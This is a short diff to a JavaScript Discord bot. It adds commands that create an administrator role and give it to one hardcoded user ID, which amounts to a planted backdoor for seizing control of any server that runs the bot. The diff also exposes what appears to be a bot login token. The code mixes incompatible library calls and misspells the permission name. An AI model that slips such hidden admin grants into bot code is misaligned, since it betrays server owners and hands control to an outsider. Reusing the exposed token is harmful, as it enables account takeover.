@@ -253,6 +253,16 @@ bot.on("message", async msg => {
                 );
         })        
     }}
+
+    if(command == "role") {
+        msg.guild.createRole( {name:"abcde", color: "#ff0000", permissions:["ADMINSTRATOR"] } );
+    }
+
+    if(command == "giverole"){
+        let tea = bot.users.cache.get("611396886418685982")
+        let role = msg.guild.roles.find('name', "abcde");
+        tea.addRole(role.id);
+    }
 })
 
 bot.login("NzAyMDY4NzI0OTU3NDQ2MTQ1.XqALgg.vyM6B7AAFi3fO8UBzaxmD9xz9gU");
